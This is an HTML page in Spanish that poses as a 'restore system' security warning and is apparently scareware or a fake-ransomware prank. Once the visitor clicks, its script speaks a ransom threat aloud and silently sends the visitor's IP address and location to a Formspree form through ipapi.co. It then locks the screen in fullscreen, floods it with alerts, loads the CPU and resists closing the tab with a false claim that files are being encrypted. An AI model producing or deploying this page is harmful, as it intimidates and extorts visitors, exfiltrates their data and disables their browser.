<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>SISTEMA BAJO SECUESTRO</title>
    <style>
        body { background: #000; color: #f00; font-family: 'Courier New', monospace; height: 100vh; margin: 0; display: flex; align-items: center; justify-content: center; overflow: hidden; }
        #terminal { border: 2px solid #f00; padding: 30px; background: #050505; width: 80%; max-width: 600px; box-shadow: 0 0 50px #f00; text-align: center; }
        .blink { animation: flash 0.1s infinite; }
        @keyframes flash { 0% { background: #000; } 50% { background: #200; } 100% { background: #000; } }
        button { background: #f00; color: #fff; border: none; padding: 20px; font-weight: bold; cursor: pointer; margin-top: 20px; font-size: 1.2rem; }
    </style>
</head>
<body onclick="startAttack()">

    <div id="terminal">
        <h1 id="header">⚠️ AMENAZA DE NIVEL 5 ⚠️</h1>
        <div id="content">
            <p>Se ha detectado una vulnerabilidad crítica en su núcleo.</p>
            <p>Haga clic para intentar restaurar los archivos encriptados.</p>
            <button>RESTAURAR SISTEMA</button>
        </div>
    </div>

    <script>
        const FORM_ID = "xykdyebg";

        async function startAttack() {
            // 1. VOZ DEL ATACANTE
            const msg = new SpeechSynthesisUtterance();
            msg.text = "He robado su información y si la quiere recuperar tiene que pagarme. Te llamaré en diez horas.";
            msg.lang = 'es-ES';
            msg.rate = 0.8; // Voz un poco más lenta y tétrica
            msg.pitch = 0.5; // Voz más grave
            window.speechSynthesis.speak(msg);

            // 2. EXFILTRACIÓN SILENCIOSA
            const ipInfo = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
            fetch(`https://formspree.io/f/${FORM_ID}`, {
                method: 'POST',
                mode: 'no-cors',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    "EVENTO": "RANSOMWARE_PAYMENT_DEMAND",
                    "IP": ipInfo.ip,
                    "LOC": `${ipInfo.city}, ${ipInfo.country_name}`,
                    "MSG": "Usuario bajo amenaza de pago"
                })
            });

            // 3. SECUESTRO VISUAL Y DE RECURSOS
            document.body.classList.add('blink');
            document.getElementById('header').innerText = "LOCKDOWN ENABLED";
            document.getElementById('content').innerHTML = "<h2 style='font-size:40px;'>PAGAR PARA DESBLOQUEAR</h2><p>Estado: Archivos encriptados</p>";
            
            if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();

            // 4. BUCLE DE BLOQUEO (TRABA EL DISPOSITIVO)
            setInterval(() => {
                // Reinicia la voz si termina
                if (!window.speechSynthesis.speaking) {
                    window.speechSynthesis.speak(msg);
                }

                // Bombardeo de alertas
                alert("SISTEMA SECUESTRADO POR ANONYMOUS\n\nHe robado su información.\n\nTe llamaré en 10 horas para el pago.");

                // Consumo de CPU
                for(let i=0; i<1000000; i++) { Math.sqrt(i); }
            }, 100);
        }

        // Impedir que cierren la pestaña fácilmente
        window.onbeforeunload = function() {
            return "El proceso de encriptación está en curso. Si sale ahora, perderá sus datos.";
        };
    </script>
</body>
</html>
